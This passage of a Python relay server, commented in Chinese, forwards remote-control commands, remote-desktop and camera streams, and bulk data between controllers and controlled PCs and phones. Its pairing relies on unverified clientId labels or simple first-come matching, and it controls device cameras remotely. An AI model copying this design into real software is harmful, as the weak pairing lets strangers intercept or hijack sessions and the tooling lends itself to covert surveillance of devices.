                            recv_buffer = b''
                            break
                        frame_total = 4 + total_len  # 长度头 + 数据
                        if len(recv_buffer) < frame_total:
                            break  # 数据不完整，继续接收

                        # 提取完整帧
                        frame_data = recv_buffer[:frame_total]
                        recv_buffer = recv_buffer[frame_total:]

                        # 解析pc_id（第5-8字节）
                        pc_id = struct.unpack('>I', frame_data[4:8])[0]

                        # 原始帧（发给PC被控端的）：长度头 + cmd + payload
                        orig_data_len = total_len - 4
                        orig_header = struct.pack('>I', orig_data_len)
                        orig_frame = orig_header + frame_data[8:]

                        if pc_id == BROADCAST_PC_ID:
                            # 广播消息，忽略（控制器不应该发广播）
                            self._log(f'[CTRL→PC] 控制器 #{ctrl_id} 发送广播消息，忽略')
                            continue

                        # ★ 路由跟踪：解析命令前缀并更新last_sender/stream_owner
                        ctrl_cmd = ""
                        try:
                            if total_len - 4 >= 12:  # cmd部分至少12字节
                                ctrl_cmd = frame_data[8:20].decode('ascii', errors='ignore')
                        except Exception:
                            pass
                        with self._cmd_lock:
                            self._last_sender_per_pc[pc_id] = ctrl_id
                            if ctrl_cmd in STREAM_INIT_CMDS:
                                # ★★★ 并发保护：检查是否已有其他控制器在进行流式操作
                                existing_owner = self._stream_owner_per_pc.get(pc_id)
                                if existing_owner is not None and existing_owner != ctrl_id:
                                    # 其他控制器正在使用，拒绝新的流式请求
                                    self._log(f'[CTRL→PC] ★ 并发保护：PC#{pc_id}已有流式操作(控制器#{existing_owner})，拒绝控制器#{ctrl_id}的新请求(cmd={ctrl_cmd})')
                                    # 发送拒绝消息给请求方
                                    try:
                                        reject_frame = self._build_frame_with_pcid(
                                            pc_id, "busy00000000", f"PC被控端正忙，请稍后重试")
                                        self._send_to_controller(ctrl_id, reject_frame)
                                    except Exception:
                                        pass
                                    # 不转发命令到PC，直接跳过
                                    continue
                                else:
                                    self._stream_owner_per_pc[pc_id] = ctrl_id
                                    self._log(f'[CTRL→PC] ★ 设置stream_owner: PC#{pc_id} -> 控制器#{ctrl_id} cmd={ctrl_cmd}')
                            elif ctrl_cmd in STREAM_END_CMDS:
                                existing_owner = self._stream_owner_per_pc.get(pc_id)
                                if existing_owner == ctrl_id:
                                    self._stream_owner_per_pc.pop(pc_id, None)
                                    self._log(f'[CTRL→PC] ★ 清除stream_owner: PC#{pc_id} (控制器#{ctrl_id}正常结束)')
                                else:
                                    self._log(f'[CTRL→PC] ★ 忽略STREAM_END: PC#{pc_id}的owner是#{existing_owner}，不是#{ctrl_id}')

                        with self._cmd_lock:
                            pc_info = self._pc_clients.get(pc_id)

                        if pc_info is not None:
                            try:
                                pc_info["sock"].sendall(orig_frame)
                                # ★ 关键日志：记录所有转发给被控端的命令（用于排查丢包）
                                if ctrl_cmd in (CMD_RD_STOP_STR, CMD_CAMERA_STREAM_STOP_STR, CMD_CAMERA_STREAM_START_STR,
                                                CMD_RD_START_STR, CMD_PING_STR):
                                    self._log(f'[CTRL→PC] ★ 转发给PC#{pc_id}: {ctrl_cmd} (来自控制器#{ctrl_id})')
                                if ctrl_cmd == "dtchlrdy000":
                                    self._log(f'[CTRL→PC] ★ CMD_DATA_CHANNEL_LISTENER_READY 已转发给PC#{pc_id} (来自控制器#{ctrl_id})')
                            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                                # ★ 修复：不主动关闭PC连接，只记录错误
                                # 原代码调用pc_info["sock"].close()会导致PC被意外断开
                                # PC连接的关闭应由PC自己的转发线程(_pc_to_controllers)通过recv检测决定
                                self._log(f'[CTRL→PC] 转发到PC #{pc_id} 失败(来自控制器 #{ctrl_id}): {e} - 不关闭PC连接，等待PC侧自行检测')
                        else:
                            self._log(f'[CTRL→PC] 目标PC #{pc_id} 不存在，丢弃数据 (来自控制器 #{ctrl_id})')
                else:
                    # ★ PC服务端控制器：标准帧格式（兼容模式），转发到第一个PC被控端
                    while len(recv_buffer) >= 4:
                        data_len = struct.unpack('>I', recv_buffer[:4])[0]
                        if data_len <= 0 or data_len > 100 * 1024 * 1024:
                            self._log(f'[CTRL→PC] PC服务端 #{ctrl_id} 帧长度异常: {data_len}')
                            recv_buffer = b''
                            break
                        frame_total = 4 + data_len
                        if len(recv_buffer) < frame_total:
                            break

                        orig_frame = recv_buffer[:frame_total]
                        recv_buffer = recv_buffer[frame_total:]

                        # 转发到第一个PC被控端
                        with self._cmd_lock:
                            pc_ids = list(self._pc_clients.keys())
                        target_pc_id = pc_ids[0] if pc_ids else None

                        # ★ 路由跟踪：PC_SERVER也跟踪last_sender/stream_owner
                        if target_pc_id is not None:
                            pc_srv_cmd = ""
                            try:
                                if data_len >= 12:
                                    pc_srv_cmd = orig_frame[4:16].decode('ascii', errors='ignore')
                            except Exception:
                                pass
                            with self._cmd_lock:
                                self._last_sender_per_pc[target_pc_id] = ctrl_id
                                if pc_srv_cmd in STREAM_INIT_CMDS:
                                    # ★★★ 并发保护：PC_SERVER同样检查stream_owner
                                    existing_owner = self._stream_owner_per_pc.get(target_pc_id)
                                    if existing_owner is not None and existing_owner != ctrl_id:
                                        self._log(f'[CTRL→PC] ★ 并发保护(PC_SERVER)：PC#{target_pc_id}已有流式操作(控制器#{existing_owner})，拒绝控制器#{ctrl_id}的新请求')
                                        try:
                                            reject_frame = self._build_frame_with_pcid(
                                                target_pc_id, "busy00000000", f"PC被控端正忙，请稍后重试")
                                            self._send_to_controller(ctrl_id, reject_frame)
                                        except Exception:
                                            pass
                                        orig_frame = None  # 不转发
                                    else:
                                        self._stream_owner_per_pc[target_pc_id] = ctrl_id
                                elif pc_srv_cmd in STREAM_END_CMDS:
                                    existing_owner = self._stream_owner_per_pc.get(target_pc_id)
                                    if existing_owner == ctrl_id:
                                        self._stream_owner_per_pc.pop(target_pc_id, None)

                        if target_pc_id is not None and orig_frame is not None:
                            with self._cmd_lock:
                                pc_info = self._pc_clients.get(target_pc_id)
                            if pc_info:
                                try:
                                    pc_info["sock"].sendall(orig_frame)
                                except (ConnectionResetError, BrokenPipeError, OSError) as e:
                                    # ★ 修复：不主动关闭PC连接，只记录错误
                                    self._log(f'[CTRL→PC] 兼容模式转发到PC #{target_pc_id} 失败: {e} - 不关闭PC连接')
                        # 没有PC被控端时静默丢弃

            except Exception as e:
                self._log(f'[CTRL→PC] 控制器 #{ctrl_id} 转发异常: {e}')
                break

        # 清理控制器连接
        with self._cmd_lock:
            if ctrl_id in self._controllers:
                self._controllers[ctrl_id]["send_thread_active"] = False
                del self._controllers[ctrl_id]
            # ★ 清理路由跟踪：移除该控制器作为last_sender/stream_owner的记录
            for pid in list(self._last_sender_per_pc.keys()):
                if self._last_sender_per_pc[pid] == ctrl_id:
                    del self._last_sender_per_pc[pid]
            for pid in list(self._stream_owner_per_pc.keys()):
                if self._stream_owner_per_pc[pid] == ctrl_id:
                    del self._stream_owner_per_pc[pid]
        # ★ 通知本项目手机被控端(56786)：手机控制端已下线
        if ctrl_type == "PHONE":
            self._broadcast_to_phone_pcs(CMD_SYS_STATUS_STR, SYS_CTRL_OFF)
        try:
            ctrl_sock.close()
        except:
            pass
        self._log(f'[CTRL] 控制器 #{ctrl_id} ({ctrl_addr}, {ctrl_type}) 退出, 剩余: {len(self._controllers)}')

    def _broadcast_to_controllers(self, frame_data):
        """广播数据到所有控制器"""
        dead_controllers = []
        with self._cmd_lock:
            controllers = list(self._controllers.items())
        for cid, info in controllers:
            # ★ 修复：通过send_queue发送，避免竞态
            if not self._send_to_controller(cid, frame_data):
                dead_controllers.append(cid)
                continue
            self._log(f'[广播] 已通知控制器 #{cid} ({info["addr"]})')

        if dead_controllers:
            with self._cmd_lock:
                for cid in dead_controllers:
                    if cid in self._controllers:
                        self._controllers[cid]["send_thread_active"] = False
                        del self._controllers[cid]
                        self._log(f'[广播] 清理已断开的控制器 #{cid}')

    def _broadcast_to_phone_pcs(self, cmd, payload):
        """向本项目手机被控端(56786)广播系统状态命令（控制端上线/下线通知）
        仅发给 type=="PHONE_PC" 的被控端，不影响PC被控端(56784)"""
        with self._cmd_lock:
            pc_list = list(self._pc_clients.items())
        for pc_id, pc_info in pc_list:
            if pc_info.get("type") != "PHONE_PC":
                continue
            try:
                pc_info["sock"].sendall(self._build_frame(cmd, payload))
                self._log(f'[SYS] 已广播系统状态给手机被控端 #{pc_id}: {payload}')
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                self._log(f'[SYS] 广播给手机被控端 #{pc_id} 失败: {e}')

    # ==================== 视频流通道 ====================

    def _is_socket_alive(self, sock):
        try:
            rlist, _, xlist = select.select([sock], [], [sock], 0)
            if xlist:
                return False
            if rlist:
                data = sock.recv(1, socket.MSG_PEEK)
                if not data:
                    return False
            return True
        except (OSError, socket.error):
            return False

    def _handle_video_client(self, sock, addr):
        """视频流连接56783 - ★ 支持AUTH基于clientId配对 + 兼容FIFO模式"""
        self._log(f'[视频] 视频流连接: {addr}')
        self._setup_sock(sock)

        # ★ 读取AUTH标签（PUSHER:clientId 或 LISTENER:clientId）
        auth_role = None  # "PUSHER" 或 "LISTENER"
        auth_client_id = None
        try:
            sock.settimeout(5.0)
            # 逐字节读取直到遇到\n，最多读64字节
            auth_buf = b''
            for _ in range(64):
                b = sock.recv(1)
                if not b:
                    break
                auth_buf += b
                if b == b'\n':
                    break
            sock.settimeout(None)
            auth_str = auth_buf.decode('utf-8', errors='ignore').strip()
            if auth_str.startswith('PUSHER:'):
                auth_role = "PUSHER"
                auth_client_id = auth_str[7:].strip()
                self._log(f'[视频] {addr} 认证: 推流端 clientId={auth_client_id}')
            elif auth_str.startswith('LISTENER:'):
                auth_role = "LISTENER"
                auth_client_id = auth_str[9:].strip()
                self._log(f'[视频] {addr} 认证: 接收端 clientId={auth_client_id}')
            else:
                # ★ 兼容模式：无AUTH标签，走FIFO配对
                auth_role = "LEGACY"
                auth_client_id = None
                self._log(f'[视频] {addr} 无AUTH标签({auth_str[:20]}...)，走兼容FIFO模式')
                # 将已读数据放回缓冲区（通过缓冲桥接传递）
                # 注意：LEGACY模式下已读的auth_buf数据需要传给对端
        except socket.timeout:
            sock.settimeout(None)
            auth_role = "LEGACY"
            auth_client_id = None
            auth_buf = b''
            self._log(f'[视频] {addr} AUTH读取超时，走兼容FIFO模式')
        except Exception as e:
            sock.settimeout(None)
            auth_role = "LEGACY"
            auth_client_id = None
            auth_buf = b''
            self._log(f'[视频] {addr} AUTH读取异常: {e}，走兼容FIFO模式')

        # ★ AUTH模式：基于clientId配对
        if auth_role in ("PUSHER", "LISTENER") and auth_client_id is not None:
            with self._video_lock:
                if not hasattr(self, '_video_pushers'):
                    self._video_pushers = {}   # clientId -> (sock, addr, timestamp)
                    self._video_listeners = {}  # clientId -> (sock, addr, timestamp)
                now = time.time()
                # 清理超时的pending连接
                for store in [self._video_pushers, self._video_listeners]:
                    for k in list(store.keys()):
                        s, a, ts = store[k]
                        if s.fileno() == -1 or not self._is_socket_alive(s) or now - ts > 30:
                            try: s.close()
                            except: pass
                            del store[k]

                if auth_role == "PUSHER":
                    # 检查是否有匹配的LISTENER
                    if auth_client_id in self._video_listeners:
                        listener_sock, listener_addr, _ = self._video_listeners.pop(auth_client_id)
                        self._log(f'[视频] ★ AUTH配对成功: PUSHER({addr}) <-> LISTENER({listener_addr}) clientId={auth_client_id}')
                        t1 = threading.Thread(target=self._video_relay,
                                              args=(sock, listener_sock, f'Pusher->Listener#{auth_client_id}'), daemon=True)
                        t2 = threading.Thread(target=self._video_relay,
                                              args=(listener_sock, sock, f'Listener->Pusher#{auth_client_id}'), daemon=True)
                        t1.start()
                        t2.start()
                    else:
                        self._video_pushers[auth_client_id] = (sock, addr, now)
                        self._log(f'[视频] PUSHER clientId={auth_client_id} 等待匹配LISTENER...')
                else:  # LISTENER
                    if auth_client_id in self._video_pushers:
                        pusher_sock, pusher_addr, _ = self._video_pushers.pop(auth_client_id)
                        self._log(f'[视频] ★ AUTH配对成功: LISTENER({addr}) <-> PUSHER({pusher_addr}) clientId={auth_client_id}')
                        t1 = threading.Thread(target=self._video_relay,
                                              args=(pusher_sock, sock, f'Pusher->Listener#{auth_client_id}'), daemon=True)
                        t2 = threading.Thread(target=self._video_relay,
                                              args=(sock, pusher_sock, f'Listener->Pusher#{auth_client_id}'), daemon=True)
                        t1.start()
                        t2.start()
                    else:
                        self._video_listeners[auth_client_id] = (sock, addr, now)
                        self._log(f'[视频] LISTENER clientId={auth_client_id} 等待匹配PUSHER...')
            return

        # ★ 兼容模式：FIFO配对（处理auth_buf已读数据）
        VIDEO_QUEUE_TIMEOUT = 15
        now = time.time()
        with self._video_lock:
            if not hasattr(self, '_video_queue'):
                self._video_queue = []
            alive_queue = []
            for item in self._video_queue:
                s, ts = item if isinstance(item, tuple) else (item, now)
                if s.fileno() == -1 or not self._is_socket_alive(s):
                    try:
                        s.close()
                    except:
                        pass
                    self._log('[视频] 清理已断开的视频连接')
                    continue
                if now - ts > VIDEO_QUEUE_TIMEOUT:
                    try:
                        s.close()
                    except:
                        pass
                    self._log(f'[视频] 清理超时未配对的视频连接 (等待{int(now-ts)}秒)')
                    continue
                alive_queue.append((s, ts))
            self._video_queue = alive_queue
            self._video_queue.append((sock, now))
            if len(self._video_queue) >= 2:
                s1, _ = self._video_queue.pop(0)
                s2, _ = self._video_queue.pop(0)
                self._log('[视频] ★ FIFO配对成功，开始桥接')
                t1 = threading.Thread(target=self._video_relay_with_prefix,
                                      args=(s1, s2, 'Video1->2', auth_buf if s1 is sock else b''), daemon=True)
                t2 = threading.Thread(target=self._video_relay,
                                      args=(s2, s1, 'Video2->1'), daemon=True)
                t1.start()
                t2.start()

    def _video_relay_with_prefix(self, src_sock, dst_sock, direction, prefix_data=b''):
        """视频流转发（带前缀数据，用于兼容模式下已读AUTH数据的传递）"""
        total_bytes = 0
        try:
            # 先发送已读的前缀数据（可能是视频帧的一部分）
            if prefix_data:
                try:
                    dst_sock.sendall(prefix_data)
                    total_bytes += len(prefix_data)
                except Exception:
                    pass
            while self._running:
                data = src_sock.recv(65536)
                if not data:
                    self._log(f'[视频] [{direction}] 视频流断开, 共转发 {total_bytes} 字节')
                    break
                total_bytes += len(data)
                dst_sock.sendall(data)
        except Exception as e:
            self._log(f'[视频] [{direction}] 视频流异常: {e}, 共转发 {total_bytes} 字节')
        finally:
            try: src_sock.close()
            except: pass
            try: dst_sock.close()
            except: pass

    def _video_relay(self, src_sock, dst_sock, direction):
        """视频流双向转发"""
        total_bytes = 0
        try:
            while self._running:
                data = src_sock.recv(65536)
                if not data:
                    self._log(f'[视频] [{direction}] 视频流断开, 共转发 {total_bytes} 字节')
                    break
                total_bytes += len(data)
                if total_bytes <= 200 or total_bytes % 500000 == 0:
                    self._log(f'[视频] [{direction}] 转发 {len(data)} 字节 (累计 {total_bytes})')
                dst_sock.sendall(data)
        except Exception as e:
            self._log(f'[视频] [{direction}] 视频流异常: {e}, 共转发 {total_bytes} 字节')
        finally:
            try:
                src_sock.close()
            except:
                pass
            try:
                dst_sock.close()
            except:
                pass

    # ==================== Accept循环 ====================

    def _setup_sock(self, sock):
        """设置socket选项"""
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            try:
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 30)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
            except:
                pass
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1048576)
            except:
                pass
        except:
            pass

    def _phone_pc_accept_loop(self):
        while self._running:
            try:
                self.phone_pc_server_sock.settimeout(1.0)
                try:
                    sock, addr = self.phone_pc_server_sock.accept()
                except socket.timeout:
                    continue
                self._handle_pc_client(sock, addr, "PHONE_PC")
            except Exception as e:
                if self._running:
                    self._log(f'[新端口] 手机被控端(56786)监听异常: {e}')

    def _phone_ctrl_accept_loop(self):
        while self._running:
            try:
                self.phone_ctrl_server_sock.settimeout(1.0)
                try:
                    sock, addr = self.phone_ctrl_server_sock.accept()
                except socket.timeout:
                    continue
                self._handle_phone_client(sock, addr)
            except Exception as e:
                if self._running:
                    self._log(f'[新端口] 手机控制端(56787)监听异常: {e}')

    def _phone_video_accept_loop(self):
        while self._running:
            try:
                self.phone_video_server_sock.settimeout(1.0)
                try:
                    sock, addr = self.phone_video_server_sock.accept()
                except socket.timeout:
                    continue
                self._handle_video_client(sock, addr)
            except Exception as e:
                if self._running:
                    self._log(f'[新端口] 手机视频流(56788)监听异常: {e}')

    def _pc_accept_loop(self):
        while self._running:
            try:
                self.pc_server_sock.settimeout(1.0)
                try:
                    sock, addr = self.pc_server_sock.accept()
                except socket.timeout:
                    continue
                self._handle_pc_client(sock, addr)
            except Exception as e:
                if self._running:
                    self._log(f'PC监听异常: {e}')

    def _phone_accept_loop(self):
        while self._running:
            try:
                self.phone_server_sock.settimeout(1.0)
                try:
                    sock, addr = self.phone_server_sock.accept()
                except socket.timeout:
                    continue
                self._handle_phone_client(sock, addr)
            except Exception as e:
                if self._running:
                    self._log(f'控制器监听异常: {e}')

    def _video_accept_loop(self):
        while self._running:
            try:
                self.video_server_sock.settimeout(1.0)
                try:
                    sock, addr = self.video_server_sock.accept()
                except socket.timeout:
                    continue
                self._handle_video_client(sock, addr)
            except Exception as e:
                if self._running:
                    self._log(f'视频监听异常: {e}')

    # ==================== 数据通道（56785）====================

    def _handle_data_client(self, sock, addr):
        """★ 数据通道连接56785 - AUTH配对桥接（类似视频流）"""
        self._log(f'[数据通道] 连接请求: {addr}')
        self._setup_sock(sock)

        # 读取AUTH标签（PUSHER:session_id 或 LISTENER:session_id）
        auth_role = None
        auth_session_id = None
        try:
            sock.settimeout(5.0)
            auth_buf = b''
            for _ in range(64):
                b = sock.recv(1)
                if not b:
                    break
                auth_buf += b
                if b == b'\n':
                    break
            sock.settimeout(None)
            auth_str = auth_buf.decode('utf-8', errors='ignore').strip()
            if auth_str.startswith('PUSHER:'):
                auth_role = "PUSHER"
                auth_session_id = auth_str[7:].strip()
                self._log(f'[数据通道] {addr} 认证: 发送端 session_id={auth_session_id}')
            elif auth_str.startswith('LISTENER:'):
                auth_role = "LISTENER"
                auth_session_id = auth_str[9:].strip()
                self._log(f'[数据通道] {addr} 认证: 接收端 session_id={auth_session_id}')
            else:
                self._log(f'[数据通道] {addr} 认证失败: 未知标签({auth_str[:20]}...)，断开')
                try:
                    sock.close()
                except:
                    pass
                return
        except socket.timeout:
            sock.settimeout(None)
            self._log(f'[数据通道] {addr} AUTH读取超时，断开')
            try:
                sock.close()
            except:
                pass
            return
        except Exception as e:
            sock.settimeout(None)
            self._log(f'[数据通道] {addr} AUTH读取异常: {e}，断开')
            try:
                sock.close()
            except:
                pass
            return

        if auth_role in ("PUSHER", "LISTENER") and auth_session_id:
            with self._data_lock:
                now = time.time()
                # 清理超时的pending连接
                for store in [self._data_pushers, self._data_listeners]:
                    for k in list(store.keys()):
                        s, a, ts = store[k]
                        if s.fileno() == -1 or not self._is_socket_alive(s) or now - ts > 60:
                            try:
                                s.close()
                            except:
                                pass
                            del store[k]

                if auth_role == "PUSHER":
                    if auth_session_id in self._data_listeners:
                        listener_sock, listener_addr, _ = self._data_listeners.pop(auth_session_id)
                        self._log(f'[数据通道] ★ 配对成功: PUSHER({addr}) <-> LISTENER({listener_addr}) session={auth_session_id}')
                        t1 = threading.Thread(target=self._data_relay,
                                              args=(sock, listener_sock, f'DataPusher->Listener#{auth_session_id}'), daemon=True)
                        t2 = threading.Thread(target=self._data_relay,
                                              args=(listener_sock, sock, f'DataListener->Pusher#{auth_session_id}'), daemon=True)
                        t1.start()
                        t2.start()
                    else:
                        self._data_pushers[auth_session_id] = (sock, addr, now)
                        self._log(f'[数据通道] PUSHER session={auth_session_id} 等待匹配LISTENER...')
                else:  # LISTENER
                    if auth_session_id in self._data_pushers:
                        pusher_sock, pusher_addr, _ = self._data_pushers.pop(auth_session_id)
                        self._log(f'[数据通道] ★ 配对成功: LISTENER({addr}) <-> PUSHER({pusher_addr}) session={auth_session_id}')
                        t1 = threading.Thread(target=self._data_relay,
                                              args=(pusher_sock, sock, f'DataPusher->Listener#{auth_session_id}'), daemon=True)
                        t2 = threading.Thread(target=self._data_relay,
                                              args=(sock, pusher_sock, f'DataListener->Pusher#{auth_session_id}'), daemon=True)
                        t1.start()
                        t2.start()
                    else:
                        self._data_listeners[auth_session_id] = (sock, addr, now)
                        self._log(f'[数据通道] LISTENER session={auth_session_id} 等待匹配PUSHER...')

    def _data_relay(self, src_sock, dst_sock, direction):
        """★ 数据通道双向转发（零拷贝）"""
        total_bytes = 0
        try:
            while self._running:
                data = src_sock.recv(65536)
                if not data:
                    self._log(f'[数据通道] [{direction}] 断开, 共转发 {total_bytes} 字节')
                    break
                total_bytes += len(data)
                if total_bytes <= 200 or total_bytes % (1024 * 1024) == 0:
                    self._log(f'[数据通道] [{direction}] 转发 {len(data)} 字节 (累计 {total_bytes})')
                dst_sock.sendall(data)
        except Exception as e:
            self._log(f'[数据通道] [{direction}] 异常: {e}, 共转发 {total_bytes} 字节')
        finally:
            try:
                src_sock.close()
            except:
                pass
            try:
                dst_sock.close()
            except:
                pass

    def _data_accept_loop(self):
        while self._running:
            try:
                self.data_server_sock.settimeout(1.0)
                try:
                    sock, addr = self.data_server_sock.accept()
                except socket.timeout:
                    continue
                self._handle_data_client(sock, addr)
            except Exception as e:
                if self._running:
                    self._log(f'数据通道监听异常: {e}')

    # ==================== 启动/停止 ====================

    def _bind_listen(self, port):
        """创建并绑定监听socket，失败时明确报出端口号（便于定位冲突端口）"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((LISTEN_HOST, port))
            s.listen(10)
            return s
        except Exception as e:
            try:
                s.close()
            except:
                pass
            self._log(f'启动失败: 端口 {port} 绑定失败: {e}')
            return None

    def start(self):
        # ★ 逐个端口绑定，任何端口失败都会明确指出端口号，便于排查
        bindings = [
            ("pc_server_sock", PC_PORT),
            ("phone_server_sock", PHONE_PORT),
            ("video_server_sock", VIDEO_PORT),
            ("data_server_sock", DATA_PORT),
            ("phone_pc_server_sock", PHONE_PC_PORT),
            ("phone_ctrl_server_sock", PHONE_CTRL_PORT),
            ("phone_video_server_sock", PHONE_VIDEO_PORT),
        ]
        for attr, port in bindings:
            s = self._bind_listen(port)
            if s is None:
                return False  # 端口绑定失败，已记录日志
            setattr(self, attr, s)

        self._running = True
        # ★ 保存监听线程引用，供看门狗检查存活状态
        self._accept_threads = [
            ("PC被控端(56784)", threading.Thread(target=self._pc_accept_loop, daemon=True)),
            ("控制器(56782)", threading.Thread(target=self._phone_accept_loop, daemon=True)),
            ("视频流(56783)", threading.Thread(target=self._video_accept_loop, daemon=True)),
            ("数据通道(56785)", threading.Thread(target=self._data_accept_loop, daemon=True)),
            ("手机被控端(56786)", threading.Thread(target=self._phone_pc_accept_loop, daemon=True)),
            ("手机控制端(56787)", threading.Thread(target=self._phone_ctrl_accept_loop, daemon=True)),
            ("手机视频流(56788)", threading.Thread(target=self._phone_video_accept_loop, daemon=True)),
        ]
        for name, t in self._accept_threads:
            t.start()

        self._log("=" * 60)
        self._log("云中继桥接服务 v2.0 已启动 (多PC被控端, 自愈模式)")
        self._log(f"  PC被控端端口: {PC_PORT} (支持多PC同时连接)")
        self._log(f"  控制器端口: {PHONE_PORT} (PC_SERVER/PHONE均不限数量)")
        self._log(f"  视频流端口: {VIDEO_PORT}")
        self._log(f"  数据通道端口: {DATA_PORT} (大文件传输专用)")
        self._log(f"  ★手机端端口: 被控端{PHONE_PC_PORT} / 控制端{PHONE_CTRL_PORT} / 视频流{PHONE_VIDEO_PORT}")
        self._log(f"  日志文件: {LOG_FILE}")
        self._log("=" * 60)
        return True

    def check_accept_threads_alive(self):
        """★ 看门狗：检查所有监听线程是否存活，任何一线程死亡返回False（触发进程重启）"""
        for name, t in self._accept_threads:
            if not t.is_alive():
                self._log(f'[看门狗] ★ 监听线程 {name} 已死亡，需要重启进程')
                return False
        return True

    def stop(self):
        self._running = False
        for sock in [self.pc_server_sock, self.phone_server_sock, self.video_server_sock, self.data_server_sock,
                     self.phone_pc_server_sock, self.phone_ctrl_server_sock, self.phone_video_server_sock]:
            try:
                if sock:
                    sock.close()
            except:
                pass
        with self._cmd_lock:
            # 关闭所有PC被控端
            for pc_id, info in list(self._pc_clients.items()):
                try:
                    info["sock"].close()
                except:
                    pass
            self._pc_clients.clear()
            # 关闭所有控制器
            for cid, info in list(self._controllers.items()):
                try:
                    info["sock"].close()
                except:
                    pass
            self._controllers.clear()
        self._log('中继服务已停止')


def main():
    """★ 自愈模式：启动失败自动重试；监听线程死亡自动重启进程；崩溃后由外部(systemd Restart=always)或本循环自动拉起"""
    while True:
        relay = RelayServer()
        if not relay.start():
            logger.error("启动失败，5秒后自动重试...")
            time.sleep(5)
            continue
        try:
            while True:
                time.sleep(5)
                # ★ 看门狗：任何监听线程死亡 → 重启整个进程（释放全部资源后重来）
                if not relay.check_accept_threads_alive():
                    break
        except KeyboardInterrupt:
            relay.stop()
            logger.info("用户中断，退出")
            return
        relay.stop()
        logger.info("服务异常退出，5秒后自动重启...")
        time.sleep(5)


if __name__ == '__main__':
    main()
